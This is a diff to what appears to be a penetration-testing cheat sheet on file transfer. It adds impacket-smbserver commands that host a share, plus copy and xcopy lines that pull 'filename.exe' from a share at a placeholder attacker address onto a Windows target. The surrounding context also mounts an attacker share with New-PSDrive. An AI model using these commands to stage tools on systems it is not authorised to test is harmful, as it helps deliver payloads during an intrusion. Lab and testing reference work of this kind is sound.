@@ -379,6 +379,18 @@ $cred = New-Object System.Management.Automation.PSCredential('<user>', $pass)
 New-PSDrive -Name "<ShareName>" -PSProvider "FileSystem" -Root "\\<attackerIP>\<ShareName> -Credential $cred
 ```
 
+**Alternatively**, if we which to just copy the file instead of mounting PSDrive we can use copy or xcopy commands as follows:
+
+```text
+# Share
+impacket-smbserver <ShareName> '<path>'
+impacket-smbserver <ShareName> $(pwd) -smb2support
+
+# Copy | Transfer
+copy \\<YOUR_IP>\<ShareName>\filename.exe
+xcopy \\<YOUR_IP>\<ShareName>\filename.exe
+```
+
 ## Transfer via SCP
 
 ```text
